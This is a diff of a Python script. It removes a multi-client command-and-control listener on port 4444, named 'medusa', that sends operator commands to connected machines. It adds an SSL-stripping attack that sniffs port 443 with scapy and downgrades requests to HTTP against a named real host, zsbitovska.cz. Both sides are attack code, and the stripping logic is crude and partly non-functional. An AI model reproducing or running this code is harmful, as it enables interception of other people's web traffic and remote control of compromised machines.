@@ -1,73 +1,78 @@
 import socket
 import threading
-from colorama import init, Fore, Style
+from scapy.all import *
+import ssl
 
-init(autoreset=True)
+# Define the target and port for SSL stripping
+TARGET_HOST = "zsbitovska.cz"
+TARGET_PORT = 443
+HTTP_PORT = 80
 
-clients = {}
-lock = threading.Lock()
-current_client_id = None
+# Function to handle client communication
+def handle_client(client_socket):
+    request = client_socket.recv(1024)
+    
+    # If the request is an HTTPS request, downgrade it to HTTP
+    if b"HTTPS" in request:
+        # Modify the request to be an HTTP request (removing the HTTPS part)
+        request = request.replace(b"HTTPS", b"HTTP")
+        
+    # Forward the modified request to the target server (HTTP port)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as forward_socket:
+        forward_socket.connect((TARGET_HOST, HTTP_PORT))
+        forward_socket.send(request)
+        
+        # Receive the response from the target
+        response = forward_socket.recv(4096)
+        
+        # Send the response back to the client
+        client_socket.send(response)
 
-def handle_client(conn, addr, client_id):
-    print(Fore.GREEN + f"[+] {client_id} connected from {addr}")
-    conn.send(b'Connected to medusa\n')
+    client_socket.close()
+
+# Function to listen for incoming connections
+def start_sniffer():
+    sniff(filter="tcp port 443", prn=packet_callback, store=0)
+
+# Packet callback function for sniffing packets
+def packet_callback(packet):
+    if packet.haslayer(TCP) and packet.haslayer(IP):
+        if packet[TCP].dport == TARGET_PORT:
+            print(f"Intercepted traffic to {TARGET_HOST}:{TARGET_PORT}")
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((TARGET_HOST, TARGET_PORT))
+
+            # Send an HTTP request instead of HTTPS
+            request = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\nConnection: close\r\n\r\n"
+            client_socket.send(request.encode())
+
+            # Receive HTTP response
+            response = client_socket.recv(4096)
+
+            # Send back to the client, simulating HTTP
+            print(f"Sending downgraded HTTP response to the client")
+            client_socket.close()
+
+# Start the server to handle SSL stripping
+def ssl_stripping_server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(("0.0.0.0", 443))
+    server_socket.listen(5)
+    
     while True:
-        try:
-            data = conn.recv(4096)
-            if not data:
-                break
-            print(Fore.CYAN + f"[{client_id}] " + Style.RESET_ALL + data.decode(errors='ignore'))
-        except:
-            break
-    with lock:
-        del clients[client_id]
-    conn.close()
-    print(Fore.RED + f"[-] {client_id} disconnected")
+        client_socket, addr = server_socket.accept()
+        print(f"Connection from {addr}")
+        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
+        client_handler.start()
 
-def accept_connections(server):
-    client_counter = 0
-    while True:
-        conn, addr = server.accept()
-        with lock:
-            client_id = f"Client{client_counter}"
-            clients[client_id] = conn
-            client_counter += 1
-        threading.Thread(target=handle_client, args=(conn, addr, client_id), daemon=True).start()
-
-def command_loop():
-    global current_client_id
-    while True:
-        cmd = input(Fore.YELLOW + "tv> " + Style.RESET_ALL).strip()
-        if cmd.startswith("rc"):
-            print(Fore.BLUE + "Available clients:")
-            for cid in clients:
-                print(f" - {cid}")
-            target = input("Select client: ").strip()
-            if target in clients:
-                current_client_id = target
-                print(Fore.MAGENTA + f"Now controlling: {current_client_id}")
-            else:
-                print(Fore.RED + "Invalid client ID.")
-        elif current_client_id and current_client_id in clients:
-            if cmd == "exit":
-                current_client_id = None
-            else:
-                try:
-                    clients[current_client_id].send(cmd.encode())
-                except:
-                    print(Fore.RED + "Failed to send command.")
-        else:
-            print(Fore.RED + "No client selected. Use 'rc'.")
-
+# Run the sniffer and server simultaneously
 def main():
-    host = "0.0.0.0"
-    port = 4444
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((host, port))
-    server.listen()
-    print(Fore.GREEN + f"[+] Server listening on {host}:{port}")
-    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
-    command_loop()
+    # Start sniffing the traffic in a background thread
+    sniffer_thread = threading.Thread(target=start_sniffer)
+    sniffer_thread.start()
+
+    # Start the SSL stripping server
+    ssl_stripping_server()
 
 if __name__ == "__main__":
     main()
